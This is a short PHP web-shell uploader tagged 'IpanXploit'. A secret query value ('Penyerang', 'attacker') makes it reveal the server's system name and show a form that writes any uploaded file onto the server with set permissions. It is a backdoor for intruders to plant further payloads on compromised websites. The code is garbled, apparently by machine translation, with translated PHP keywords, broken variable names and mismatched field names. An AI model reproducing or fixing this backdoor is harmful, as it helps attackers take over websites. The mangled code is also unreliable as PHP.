<html>
<! - IpanXploit ->
</html>

<? php

error_reporting (0);
set_time_limit (0);

if ($ _ DAPATKAN ['X'] == "Penyerang") {
echo "<center> <b> Uname:". php_uname (). "<br> </b>"; 
echo '<font color = "black" size = "4">';
if (isset ($ _ POST ['Kirim'])) {
    $ filesir = ""; 
    $ maxfile = '2000000';
    $ mode = '0644';
    $ userfile_name = $ _FILES ['gambar'] ['nama'];
    $ userfile_tmp = $ _FILES ['image'] ['tmp_name'];
    if (isset ($ _ FILES ['image'] ['name'])) {
        $ qx = $ Filedir. $ userfile_name;
        @move_uploaded_file ($ userfile_tmp, $ qx);
        @chmod ($ qx, octdec ($ mode));
echo "<a href=$userfile_name> <center> <b> Upload yang Berhasil: D ==> $ userfile_name </b> </center> </a>";
}
}
lain{
echo '<form method = "POST" action = "#" enctype = "multipart / form-data"> <input type = "file" name = "image"> <br> <input type = "Kirim" name = " Kirimkan "value =" Upload "> </form> ';
}
echo '</center> </font>';

}
?>